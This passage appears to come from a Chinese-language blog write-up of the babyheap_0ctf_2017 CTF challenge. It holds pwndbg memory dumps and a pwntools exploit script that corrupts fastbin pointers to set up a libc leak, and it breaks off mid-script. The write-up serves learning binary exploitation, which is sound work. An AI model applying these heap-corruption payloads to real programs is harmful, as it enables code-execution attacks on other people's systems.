RODATA</span><br><span class="line">     <span class="number">0xeb511a07000</span>      <span class="number">0xeb511a08000</span> rw-p     <span class="number">1000</span> <span class="number">0</span></span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555556000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      /home/ubuntu/Desktop/babyheap_0ctf_2017</span><br><span class="line">    <span class="number">0x555555755000</span>     <span class="number">0x555555756000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /home/ubuntu/Desktop/babyheap_0ctf_2017</span><br><span class="line">    <span class="number">0x555555756000</span>     <span class="number">0x555555757000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /home/ubuntu/Desktop/babyheap_0ctf_2017</span><br><span class="line">    <span class="number">0x7ffff7a0d000</span>     <span class="number">0x7ffff7bcd000</span> r-xp   <span class="number">1</span>c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7bcd000</span>     <span class="number">0x7ffff7dcd000</span> ---p   <span class="number">200000</span> <span class="number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dcd000</span>     <span class="number">0x7ffff7dd1000</span> r--p     <span class="number">4000</span> <span class="number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd1000</span>     <span class="number">0x7ffff7dd3000</span> rw-p     <span class="number">2000</span> <span class="number">1</span>c4000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd3000</span>     <span class="number">0x7ffff7dd7000</span> rw-p     <span class="number">4000</span> <span class="number">0</span></span><br><span class="line">    <span class="number">0x7ffff7dd7000</span>     <span class="number">0x7ffff7dfd000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd9000</span>     <span class="number">0x7ffff7fdc000</span> rw-p     <span class="number">3000</span> <span class="number">0</span></span><br><span class="line">    <span class="number">0x7ffff7ff7000</span>     <span class="number">0x7ffff7ffa000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7ffa000</span>     <span class="number">0x7ffff7ffc000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span></span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [<span class="built_in">stack</span>]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>通过对比发现，变动的只有第一行的地址：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x1d0f97e2c000</span>     <span class="number">0x1d0f97e2d000</span> rw-p     <span class="number">1000</span> <span class="number">0</span> （第一次gdb调试）</span><br><span class="line">    <span class="number">0xeb511a07000</span>      <span class="number">0xeb511a08000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>  （第二次gdb调试）</span><br></pre></td></tr></table></figure>

<p>到这里，可以猜测一下，程序的指针应该也存放在这片内存区域中。<br>我们重新 gdb 调试，通过执行函数 Allocate 和 fill，来看一下这片内存：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ cd Desktop/</span><br><span class="line">➜  <span class="function">Desktop gdb babyheap_0ctf_2017</span></span><br><span class="line"><span class="function">GNU <span class="title">gdb</span> <span class="params">(Ubuntu <span class="number">7.11</span><span class="number">.1</span><span class="number">-0u</span>buntu1~<span class="number">16.5</span>)</span> 7.11.1</span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> <span class="params">(C)</span> 2016 Free Software Foundation, Inc.</span></span><br><span class="line"><span class="function">License GPLv3+: GNU GPL version 3 <span class="keyword">or</span> later &lt;http:<span class="comment">//gnu.org/licenses/gpl.html&gt;</span></span></span><br><span class="line"><span class="function">This is <span class="built_in">free</span> software: you are <span class="built_in">free</span> to change <span class="keyword">and</span> redistribute it.</span></span><br><span class="line"><span class="function">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">and</span> &quot;show warranty&quot; <span class="keyword">for</span> details.</span></span><br><span class="line"><span class="function">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span></span><br><span class="line"><span class="function">Type &quot;show configuration&quot; <span class="keyword">for</span> configuration details.</span></span><br><span class="line"><span class="function">For bug reporting instructions, please see:</span></span><br><span class="line"><span class="function">&lt;http:<span class="comment">//www.gnu.org/software/gdb/bugs/&gt;.</span></span></span><br><span class="line"><span class="function">Find the GDB manual <span class="keyword">and</span> other documentation resources online at:</span></span><br><span class="line"><span class="function">&lt;http:<span class="comment">//www.gnu.org/software/gdb/documentation/&gt;.</span></span></span><br><span class="line"><span class="function">For help, type &quot;help&quot;.</span></span><br><span class="line"><span class="function">Type &quot;apropos word&quot; to search <span class="keyword">for</span> commands related to &quot;word&quot;...</span></span><br><span class="line"><span class="function">pwndbg: loaded 192 commands. Type pwndbg [filter] <span class="keyword">for</span> a <span class="built_in">list</span>.</span></span><br><span class="line"><span class="function">pwndbg: created $rebase, $ida gdb <span class="title">functions</span> <span class="params">(can be used with print/<span class="keyword">break</span>)</span></span></span><br><span class="line"><span class="function">Reading symbols from babyheap_0ctf_2017...<span class="params">(no debugging symbols found)</span>...done.</span></span><br><span class="line"><span class="function">pwndbg&gt; r</span></span><br><span class="line"><span class="function">Starting program: /home/ubuntu/Desktop/babyheap_0ctf_2017</span></span><br><span class="line"><span class="function"></span>===== Baby Heap in <span class="number">2017</span> =====</span><br><span class="line"><span class="number">1.</span> Allocate</span><br><span class="line"><span class="number">2.</span> Fill</span><br><span class="line"><span class="number">3.</span> Free</span><br><span class="line"><span class="number">4.</span> Dump</span><br><span class="line"><span class="number">5.</span> Exit</span><br><span class="line">Command: <span class="number">1</span></span><br><span class="line">Size: <span class="number">20</span></span><br><span class="line">Allocate Index <span class="number">0</span></span><br><span class="line"><span class="number">1.</span> Allocate</span><br><span class="line"><span class="number">2.</span> Fill</span><br><span class="line"><span class="number">3.</span> Free</span><br><span class="line"><span class="number">4.</span> Dump</span><br><span class="line"><span class="number">5.</span> Exit</span><br><span class="line">Command: <span class="number">2</span></span><br><span class="line">Index: <span class="number">0</span></span><br><span class="line">Size: <span class="number">40</span></span><br><span class="line">Content: aaaaaaaaaaaaaaaaaa</span><br><span class="line">^C</span><br><span class="line">Program received signal SIGINT, Interrupt.</span><br><span class="line"><span class="number">0x00007ffff7b04320</span> in __read_nocancel () at ../sysdeps/unix/syscall-<span class="keyword">template</span>.S:<span class="number">84</span></span><br><span class="line"><span class="number">84</span>	../sysdeps/unix/syscall-<span class="keyword">template</span>.S: No such file <span class="keyword">or</span> directory.</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> RAX  <span class="number">0xfffffffffffffe00</span></span><br><span class="line"> RBX  <span class="number">0x0</span></span><br><span class="line"> RCX  <span class="number">0x7ffff7b04320</span> (__read_nocancel+<span class="number">7</span>) ◂— cmp    rax, <span class="number">-0xfff</span></span><br><span class="line"> RDX  <span class="number">0x15</span></span><br><span class="line"> RDI  <span class="number">0x0</span></span><br><span class="line"> RSI  <span class="number">0x555555757023</span> ◂— <span class="number">0x20fe10000000000</span></span><br><span class="line"> R8   <span class="number">0x7ffff7fda700</span> ◂— <span class="number">0x7ffff7fda700</span></span><br><span class="line"> R9   <span class="number">0x9</span></span><br><span class="line"> R10  <span class="number">0x0</span></span><br><span class="line"> R11  <span class="number">0x246</span></span><br><span class="line"> R12  <span class="number">0x555555554a40</span> ◂— <span class="keyword">xor</span>    ebp, ebp</span><br><span class="line"> R13  <span class="number">0x7fffffffdef0</span> ◂— <span class="number">0x1</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x7fffffffddc0</span> —▸ <span class="number">0x7fffffffddf0</span> —▸ <span class="number">0x7fffffffde10</span> —▸ <span class="number">0x5555555553e0</span> ◂— push   r15</span><br><span class="line"> RSP  <span class="number">0x7fffffffdd98</span> —▸ <span class="number">0x5555555551fd</span> ◂— mov    qword ptr [rbp - <span class="number">8</span>], rax</span><br><span class="line"> RIP  <span class="number">0x7ffff7b04320</span> (__read_nocancel+<span class="number">7</span>) ◂— cmp    rax, <span class="number">-0xfff</span></span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► <span class="number">0x7ffff7b04320</span> &lt;__read_nocancel+<span class="number">7</span>&gt;     cmp    rax, <span class="number">-0xfff</span></span><br><span class="line">   <span class="number">0x7ffff7b04326</span> &lt;__read_nocancel+<span class="number">13</span>&gt;    jae    read+<span class="number">73</span> &lt;read+<span class="number">73</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x7ffff7b04359</span> &lt;read+<span class="number">73</span>&gt;               mov    rcx, qword ptr [rip + <span class="number">0x2ccb18</span>]</span><br><span class="line">   <span class="number">0x7ffff7b04360</span> &lt;read+<span class="number">80</span>&gt;               neg    eax</span><br><span class="line">   <span class="number">0x7ffff7b04362</span> &lt;read+<span class="number">82</span>&gt;               mov    dword ptr fs:[rcx], eax</span><br><span class="line">   <span class="number">0x7ffff7b04365</span> &lt;read+<span class="number">85</span>&gt;               <span class="keyword">or</span>     rax, <span class="number">0xffffffffffffffff</span></span><br><span class="line">   <span class="number">0x7ffff7b04369</span> &lt;read+<span class="number">89</span>&gt;               ret</span><br><span class="line"></span><br><span class="line">   <span class="number">0x7ffff7b0436a</span>                         nop    word ptr [rax + rax]</span><br><span class="line">   <span class="number">0x7ffff7b04370</span> &lt;write&gt;                 cmp    dword ptr [rip + <span class="number">0x2d23c9</span>], <span class="number">0</span> &lt;<span class="number">0x7ffff7dd6740</span>&gt;</span><br><span class="line">   <span class="number">0x7ffff7b04377</span> &lt;write+<span class="number">7</span>&gt;               jne    write+<span class="number">25</span> &lt;write+<span class="number">25</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x7ffff7b04389</span> &lt;write+<span class="number">25</span>&gt;              sub    rsp, <span class="number">8</span></span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffdd98</span> —▸ <span class="number">0x5555555551fd</span> ◂— mov    qword ptr [rbp - <span class="number">8</span>], rax</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffdda0</span> ◂— <span class="number">0x28</span> <span class="comment">/* &#x27;(&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffdda8</span> —▸ <span class="number">0x555555757010</span> ◂— <span class="string">&#x27;aaaaaaaaaaaaaaaaaa\n&#x27;</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffddb0</span> ◂— <span class="number">0x13</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│ rbp  <span class="number">0x7fffffffddc0</span> —▸ <span class="number">0x7fffffffddf0</span> —▸ <span class="number">0x7fffffffde10</span> —▸ <span class="number">0x5555555553e0</span> ◂— push   r15</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffddc8</span> —▸ <span class="number">0x555555554f48</span> ◂— jmp    <span class="number">0x555555554f4e</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffddd0</span> ◂— <span class="number">0x0</span></span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">7f</span>fff7b04320 __read_nocancel+<span class="number">7</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">5555555551f</span>d</span><br><span class="line">   f <span class="number">2</span>     <span class="number">555555554f</span>48</span><br><span class="line">   f <span class="number">3</span>     <span class="number">555555555188</span></span><br><span class="line">   f <span class="number">4</span>     <span class="number">7f</span>fff7a2d840 __libc_start_main+<span class="number">240</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">     <span class="number">0xf9ce7410000</span>      <span class="number">0xf9ce7411000</span> rw-p     <span class="number">1000</span> <span class="number">0</span></span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555556000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      /home/ubuntu/Desktop/babyheap_0ctf_2017</span><br><span class="line">    <span class="number">0x555555755000</span>     <span class="number">0x555555756000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /home/ubuntu/Desktop/babyheap_0ctf_2017</span><br><span class="line">    <span class="number">0x555555756000</span>     <span class="number">0x555555757000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /home/ubuntu/Desktop/babyheap_0ctf_2017</span><br><span class="line">    <span class="number">0x555555757000</span>     <span class="number">0x555555778000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [heap]</span><br><span class="line">    <span class="number">0x7ffff7a0d000</span>     <span class="number">0x7ffff7bcd000</span> r-xp   <span class="number">1</span>c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7bcd000</span>     <span class="number">0x7ffff7dcd000</span> ---p   <span class="number">200000</span> <span class="number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dcd000</span>     <span class="number">0x7ffff7dd1000</span> r--p     <span class="number">4000</span> <span class="number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd1000</span>     <span class="number">0x7ffff7dd3000</span> rw-p     <span class="number">2000</span> <span class="number">1</span>c4000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd3000</span>     <span class="number">0x7ffff7dd7000</span> rw-p     <span class="number">4000</span> <span class="number">0</span></span><br><span class="line">    <span class="number">0x7ffff7dd7000</span>     <span class="number">0x7ffff7dfd000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd9000</span>     <span class="number">0x7ffff7fdc000</span> rw-p     <span class="number">3000</span> <span class="number">0</span></span><br><span class="line">    <span class="number">0x7ffff7ff7000</span>     <span class="number">0x7ffff7ffa000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7ffa000</span>     <span class="number">0x7ffff7ffc000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span></span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [<span class="built_in">stack</span>]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>再看一下 0xf9ce7410000 这片内存区域，确定是程序结构体中指针存放的位置，标注一下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xf9ce7410000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">.....（省略内容均为空）</span><br><span class="line"><span class="number">0xf9ce7410a90</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000014</span></span><br><span class="line">    		    #用来判断堆块是否存在   #记录content的大小</span><br><span class="line"><span class="number">0xf9ce7410aa0</span>:	<span class="number">0x0000555555757010</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">                #指向<span class="built_in">calloc</span>出来的chunk_data</span><br><span class="line">.....（省略内容均为空）</span><br><span class="line"><span class="number">0xf9ce7410ff0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xf9ce7411000</span>:	Cannot access memory at address <span class="number">0xf9ce7411000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<h1 id="exp-讲解"><a href="#exp-讲解" class="headerlink" title="exp 讲解"></a>exp 讲解</h1><h2 id="exp-内容"><a href="#exp-内容" class="headerlink" title="exp 内容"></a>exp 内容</h2><p>exp 的主要内容如下：</p>
<blockquote>
<p>exp 来自@yichen 师傅：<a target="_blank" rel="noopener" href="https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ">https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./babyheap_0ctf_2017_patch&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyheap_0ctf_2017_patch&#x27;</span>)</span><br><span class="line"></span><br><span class="line">#首先是定义的一些函数，对应着程序的功能</span><br><span class="line">def alloc(size):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">def fill(idx, content):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">def <span class="built_in">free</span>(idx):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">def dump(idx):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvline()</span><br><span class="line">    <span class="keyword">return</span> p.recvline()</span><br><span class="line">def unsorted_offset_arena(idx):</span><br><span class="line">    word_bytes = context.word_size / <span class="number">8</span></span><br><span class="line">    offset = <span class="number">4</span>  <span class="meta"># lock</span></span><br><span class="line">    offset += <span class="number">4</span>  <span class="meta"># flags</span></span><br><span class="line">    offset += word_bytes * <span class="number">10</span>  <span class="meta"># offset fastbin</span></span><br><span class="line">    offset += word_bytes * <span class="number">2</span>  <span class="meta"># top,last_remainder</span></span><br><span class="line">    offset += idx * <span class="number">2</span> * word_bytes  <span class="meta"># idx</span></span><br><span class="line">    offset -= word_bytes * <span class="number">2</span>  <span class="meta"># bin overlap</span></span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line"></span><br><span class="line">#首先申请<span class="number">4</span>个fast chunk和<span class="number">1</span>个small chunk</span><br><span class="line">alloc(<span class="number">0x10</span>)#index0</span><br><span class="line">alloc(<span class="number">0x10</span>)#index1</span><br><span class="line">alloc(<span class="number">0x10</span>)#index2</span><br><span class="line">alloc(<span class="number">0x10</span>)#index3</span><br><span class="line">alloc(<span class="number">0x80</span>)#index4</span><br><span class="line"></span><br><span class="line"><span class="meta">#free两个,这时候会放到fastbins中,而且因为是后进的,所以</span></span><br><span class="line"><span class="meta">#fastbin[0]-&gt;index2-&gt;index1-&gt;NULL</span></span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">#这个时候我们去对index0进行fill操作,他就会把index2的指针的末位改成<span class="number">0x80</span>,也就指向了index4</span><br><span class="line">#解释一下,前面申请了<span class="number">4</span>块<span class="number">0x10</span>的,加上chunk的一些信息,合起来是<span class="number">0x80</span></span><br><span class="line">#所以把那个末位改成<span class="number">0x80</span>就指向了index4,这样chunk4就被放到了fastbins中</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">#然后再通过index3去进行写入,把index4的大小改成<span class="number">0x21</span></span><br><span class="line">#这么做是因为当申请index4这块内存的时候,他会检查大小是不是fast chunk的范围内</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br><span class="line"></span><br><span class="line">#改好index4的大小之后去申请两次，这样就把原来的fastbins中的给申请出来了</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">#申请成功之后index2就指向index4</span><br><span class="line">#为了让index4能够被放到unsortedbins中,要把它的大小改回来</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br><span class="line"></span><br><span class="line">#再申请一个防止index4与top chunk合并了</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">#这时候<span class="built_in">free</span>就会把index4放到unsorted中了</span><br><span class="line"><span class="built_in">free</span>(<span 